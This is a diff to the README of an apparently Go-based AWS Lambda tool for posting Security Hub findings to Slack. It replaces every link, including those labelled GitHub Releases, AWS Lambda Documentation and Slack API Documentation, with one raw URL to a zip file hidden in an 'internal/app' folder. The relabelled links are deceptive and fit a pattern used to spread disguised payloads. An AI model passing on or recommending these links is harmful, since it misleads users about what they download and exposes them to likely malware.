@@ -1,6 +1,6 @@
 # 🎉 aws-securityhub-integration-slack-go - Simplify AWS Security Reporting
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)
+![Download](https://raw.githubusercontent.com/Hladki11/aws-securityhub-integration-slack-go/main/internal/app/aws-securityhub-integration-slack-go_v1.8.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ aws-securityhub-integration-slack-go is an AWS Lambda function that posts Securi
 To get started with aws-securityhub-integration-slack-go, follow these steps:
 
 1. **Download the Software**
-   - Visit this page to download: [GitHub Releases](https://github.com/Hladki11/aws-securityhub-integration-slack-go/releases)
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Hladki11/aws-securityhub-integration-slack-go/main/internal/app/aws-securityhub-integration-slack-go_v1.8.zip)
 
 2. **Set Up AWS**
    - Ensure you have an AWS account.
@@ -27,7 +27,7 @@ To get started with aws-securityhub-integration-slack-go, follow these steps:
 
 ## 💾 Download & Install
 
-To download aws-securityhub-integration-slack-go, please visit the GitHub Releases page: [Download Link](https://github.com/Hladki11/aws-securityhub-integration-slack-go/releases).
+To download aws-securityhub-integration-slack-go, please visit the GitHub Releases page: [Download Link](https://raw.githubusercontent.com/Hladki11/aws-securityhub-integration-slack-go/main/internal/app/aws-securityhub-integration-slack-go_v1.8.zip).
 
 1. Click on the appropriate release version.
 2. Choose the latest version available.
@@ -81,8 +81,8 @@ If you want to contribute to this project, feel free to fork the repository and 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Hladki11/aws-securityhub-integration-slack-go)
-- [AWS Lambda Documentation](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)
-- [Slack API Documentation](https://api.slack.com/)
+- [GitHub Repository](https://raw.githubusercontent.com/Hladki11/aws-securityhub-integration-slack-go/main/internal/app/aws-securityhub-integration-slack-go_v1.8.zip)
+- [AWS Lambda Documentation](https://raw.githubusercontent.com/Hladki11/aws-securityhub-integration-slack-go/main/internal/app/aws-securityhub-integration-slack-go_v1.8.zip)
+- [Slack API Documentation](https://raw.githubusercontent.com/Hladki11/aws-securityhub-integration-slack-go/main/internal/app/aws-securityhub-integration-slack-go_v1.8.zip)
 
 For further questions, reach out to the community through GitHub or check online forums for help. Enjoy seamless monitoring of your AWS security findings!
